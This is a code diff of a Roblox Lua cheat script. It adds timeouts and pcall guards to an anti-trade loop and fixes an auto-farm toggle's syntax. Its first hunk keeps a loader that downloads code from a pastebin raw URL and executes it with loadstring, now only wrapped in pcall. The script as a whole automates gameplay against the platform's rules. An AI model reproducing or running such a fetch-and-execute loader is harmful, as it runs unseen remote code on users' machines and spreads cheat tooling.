@@ -1,4 +1,7 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/aagBEyp8", true))()
+-- External loader — wrapped in pcall so errors here don't kill the rest of the script
+pcall(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/aagBEyp8", true))()
+end)
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -232,30 +235,40 @@ local LocalPlayer2 = Players2.LocalPlayer
 
 -- Anti Stealer loop
 local DeclineTrade, u51, u52
-do
-    local Trade = ReplicatedStorage:WaitForChild("Trade")
-    local StartTrade = Trade:WaitForChild("StartTrade")
-    DeclineTrade = Trade:WaitForChild("DeclineTrade")
-    u51 = false
+u51 = false
 
-    function u52()
-        if u51 then return end
-        u51 = true
-        task.spawn(function()
-            while u47 do
-                pcall(function() DeclineTrade:FireServer() end)
-                task.wait(0.1)
-            end
-            u51 = false
-        end)
-    end
-
-    StartTrade.OnClientEvent:Connect(function()
-        if not u47 then return end
-        pcall(function() DeclineTrade:FireServer() end)
-        u52()
+function u52()
+    if u51 then return end
+    u51 = true
+    task.spawn(function()
+        while u47 do
+            pcall(function() if DeclineTrade then DeclineTrade:FireServer() end end)
+            task.wait(0.1)
+        end
+        u51 = false
     end)
 end
+
+-- Deferred Trade remote hookup — won't block or crash if Trade doesn't exist
+task.spawn(function()
+    local ok, Trade = pcall(function()
+        return ReplicatedStorage:WaitForChild("Trade", 15) -- 15s timeout, not infinite
+    end)
+    if not ok or not Trade then return end
+
+    local ok2, StartTrade = pcall(function() return Trade:WaitForChild("StartTrade", 10) end)
+    local ok3, _DT       = pcall(function() return Trade:WaitForChild("DeclineTrade", 10) end)
+
+    if ok3 and _DT then DeclineTrade = _DT end
+
+    if ok2 and StartTrade then
+        StartTrade.OnClientEvent:Connect(function()
+            if not u47 then return end
+            pcall(function() if DeclineTrade then DeclineTrade:FireServer() end end)
+            u52()
+        end)
+    end
+end)
 
 -- Auto Role Notification
 local u29, u30, u31 = false, nil, nil
@@ -1611,7 +1624,7 @@ local function stopAutoFarm()  end
 
 AutoFarmSec:AddToggle({ Text="Enable Auto Farm", Flag="AutoFarm", Default=false,
     Callback=function(p)
-        Config and (Config.CoinFarm2 and (Config.CoinFarm2.State = p))
+        if Config and Config.CoinFarm2 then Config.CoinFarm2.State = p end
         isActive = p
         if p then startAutoFarm() else stopAutoFarm() end
     end
